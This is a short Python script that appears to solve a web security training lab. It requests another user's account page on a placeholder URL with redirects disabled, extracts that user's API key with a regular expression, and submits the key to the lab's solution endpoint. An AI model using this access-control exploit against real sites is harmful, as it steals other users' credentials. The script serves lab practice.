import requests
import re

url_target='YOUR_URL'
path="/my-account?id=carlos"

res=requests.get(url_target+path,allow_redirects=False)
print(res.status_code)
print(res.text)

match=re.search(r"Your API Key is:\s*(.*?)</div>", res.text)
api_key=match.group(1)
print(api_key)

res_submit=requests.post(url_target+'/submitSolution', data={
        "answer": api_key
    })

